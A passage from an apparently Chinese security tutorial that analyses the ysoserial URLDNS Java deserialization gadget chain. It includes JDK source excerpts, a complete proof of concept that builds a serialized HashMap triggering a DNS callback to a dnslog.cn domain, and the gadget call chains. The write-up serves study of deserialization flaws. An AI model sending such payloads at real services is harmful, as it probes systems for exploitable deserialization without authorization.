            InetAddress addr = getHostAddress(u);
            if (addr != null) {
                h += addr.hashCode();
            } else {
                String host = u.getHost();
                if (host != null)
                    h += host.toLowerCase().hashCode();
            }
            // Generate the file part.
            String file = u.getFile();
            if (file != null)
                h += file.hashCode();
            // Generate the port part.
            if (u.getPort() == -1)
                h += getDefaultPort();
            else
                h += u.getPort();
            // Generate the ref part.
            String ref = u.getRef();
            if (ref != null)
                h += ref.hashCode();
            return h;
        }
u 是我们传入的url，在调用`getHostAddress`方法时，会进行dns查询。
这是正面分析的流程。
回到开始的Hashmap#readObject
    // Read the keys and values, and put the mappings in the HashMap
                for (int i = 0; i [] tab;
            if (size > 0 && (tab = table) != null) {
                for (int i = 0; i  e = tab[i]; e != null; e = e.next) {
                        s.writeObject(e.key);
                        s.writeObject(e.value);
                    }
                }
            }
        }
这里的key以及value是从tab中取的，而tab的值即HashMap中table的值。
想要修改table的值，就需要调用HashMap#put方法，而HashMap#put方法中也会对key调用一次hash方法，所以在这里就会产生第一次dns查询：
    public V put(K key, V value) {
            return putVal(hash(key), key, value, false, true);
        }
为了避免这一次的dns查询（防止本机与目标机器发送的dns请求混淆），ysoserial 中使用`SilentURLStreamHandler`
方法，直接返回null，并不会像`URLStreamHandler`那样去调用一系列方法最终到`getByName`，因此也就不会触发dns查询了
    static class SilentURLStreamHandler extends URLStreamHandler {
                    protected URLConnection openConnection(URL u) throws IOException {
                            return null;
                    }
                    protected synchronized InetAddress getHostAddress(URL u) {
                            return null;
                    }
            }
除了这种方法还可以在本地生成payload时，将hashCode设置不为`-1`的其他值。
URL#hashCode
    public synchronized int hashCode() {
            if (hashCode != -1)
                return hashCode;
            hashCode = handler.hashCode(this);
            return hashCode;
        }
如果不为`-1`，那么直接返回了。也就不会进行`handler.hashCode(this);`这一步计算hashcode，也就没有之后的`getByName`，获取dns查询
    /**
         * The URLStreamHandler for this URL.
         */
        transient URLStreamHandler handler;
        /* Our hash code.
         * @serial
         */
        private int hashCode = -1;
而hashCode是通过`private`关键字进行修饰的（本类中可使用），可以通过反射来修改hashCode的值
    package demo;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.net.URL;
    public class Main {
        public static void main(String[] args) throws Exception {
            HashMap map = new HashMap();
            URL url = new URL("http://7gjq24.dnslog.cn");
            Field f = Class.forName("java.net.URL").getDeclaredField("hashCode"); // 反射获取URL类中的hashCode
            f.setAccessible(true); // 绕过Java语言权限控制检查的权限
            f.set(url,123);
            System.out.println(url.hashCode());
            map.put(url,123); // 调用HashMap对象中的put方法，此时因为hashcode不为-1，不再触发dns查询
        }
    }
完整的POC：
    package demo;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.net.URL;
    import java.io.FileOutputStream;
    import java.io.FileInputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    public class Main {
        public static void main(String[] args) throws Exception {
            HashMap map = new HashMap();
            URL url = new URL("http://7gjq24.dnslog.cn");
            Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
            f.setAccessible(true); // 绕过Java语言权限控制检查的权限
            f.set(url,123); // 设置hashcode的值为-1的其他任何数字
            System.out.println(url.hashCode());
            map.put(url,123); // 调用HashMap对象中的put方法，此时因为hashcode不为-1，不再触发dns查询
            f.set(url,-1); // 将hashcode重新设置为-1，确保在反序列化成功触发
            try {
                FileOutputStream fileOutputStream = new FileOutputStream("./urldns.ser");
                ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
                outputStream.writeObject(map);
                outputStream.close();
                fileOutputStream.close();
                FileInputStream fileInputStream = new FileInputStream("./urldns.ser");
                ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);
                inputStream.readObject();
                inputStream.close();
                fileInputStream.close();
            }
            catch (Exception e){
                e.printStackTrace();
            }
        }
    }
再来调试下 ysoserial中的 URLDNS 模块，设置debug参数：
`URLDNS "http://7mczz6.dnslog.cn"`
直接debug报错：
改一下Project 和 Moudles中的 `Project language level`
，其实就是所有都设置成一样的，包括pom.xml,实在不行，重新 `git pull` 重新导入idea 也能解决
下断点进行单步调试，最后看这里
方法之间的调用也很清楚的展示了出来。
借用一位师傅总结的 gadgets来结束全文：
JDK1.8下的调用路线：
  1. HashMap->readObject()
  2. HashMap->hash()
  3. URL->hashCode()
  4. URLStreamHandler->hashCode()
  5. URLStreamHandler->getHostAddress()
  6. InetAddress->getByName()
而在jdk1.7u80环境下调用路线会有一处不同，但是大同小异：
  1. HashMap->readObject()
  2. **HashMap- >putForCreate()**
  3. HashMap->hash()
  4. URL->hashCode()
  5. 之后相同
# 参考资料
感谢：